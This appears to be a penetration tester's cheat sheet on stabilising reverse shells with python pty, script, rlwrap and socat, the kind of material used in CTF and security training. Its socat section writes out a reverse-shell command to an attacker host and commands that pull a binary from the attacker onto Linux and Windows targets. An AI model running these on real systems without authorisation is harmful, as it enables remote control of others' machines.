# shell_upgrades

## this is what you came here for

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 37 cols 172
```
> follow this with `CTRL+Z` then   `stty raw -echo;fg` `ENTER ENTER`


## Technique 0: script

kind of like a poor version of python/rlwrap
stty does NOT behave nicely so it can cause display issues

> once your shell has landed; ONLY WORKS IF `script` is present on the target unix system
```
script /dev/null -c bash

explanation
    script      ; binary we run
    /dev/null   ; the log file location
    -c bash     ; the command we will be logging
```

my preference is to have a "fragile shell" but with rlwrap
the display issues script brings are NOT worth it
display issues cause too much lost information

my 'lost information' experience may be box/system specific to a single instance

> alternate 'script' upgrade
```sh
# catch the reverse shell
script -q bash
ctrl + Z 
stty raw -echo; fg 
export TERM=xterm
bash
# 2nd bash may not be needed
```


## Technique 1: python

    python -c 'import pty;pty.spawn("/bin/bash")' 
    export TERM=xterm -- this will give us access to term commands such as clear. 
    Ctrl + Z. (background the shell on attacker machine)
    stty raw -echo; fg 
    [LOCAL] stty -a  ; take note of row col
    [REV_SHELL] stty rows LOCAL_ROW columns LOCAL_COLS
    
Last 2 steps does two things: 
	first, it turns off our own terminal echo 
	(which gives us access to tab autocompletes, the arrow keys, and Ctrl + C). 
	It then foregrounds the shell, thus completing the process. 


## Technique 2: rlwrap

Useful for Windows Shell stabilization (Notoriously difficult)
Gives access to history, tab complete, arrow keys 
NO ACCESS TO CTRL+C BY DEFAULT

```sh
rlwrap nc -lvnp <port>
Ctrl+Z; stty raw -echo; fg  (gives access to ctrl+c)
```

## Technique 3: socat

only useful VS linux.
Syntax for Sending/Receiving is Unique to socat
serve a socat static compiled binary (no dependencies)

```cmd
Attacker: sudo python3 -m http.server 80    
Linux Target: wget <LOCAL-IP>/socat -O /tmp/socat
Windows Target: Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

Note the windows command is an example of serving; 
socat will not work for our purposes on windows

Listener: socat TCP-L:\<port\> FILE:`tty`,raw,echo=0
Speaker: socat TCP:\<attacker-ip\>:\<attacker-port\> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

-d -d  added to command will increase verbosity (good for learning)

Real world uses socat whenever possible; its possible to encrypt shell traffic
Replace above TCP with OPENSSL.
A bit involved, but worth learning NEXT.


## Change Terminal TTY Size

necessary for using progs which overwrite the screen (nano, vi, etc)
Terminal does this automatically with a regular shell;
must be manually done with a Reverse/Bind shell

-    Attacker: stty -a       (Take note of rows/cols information)
-    Target: stty rows    (info from attackbox)
-    Target: stty cols    (info from attackbox)


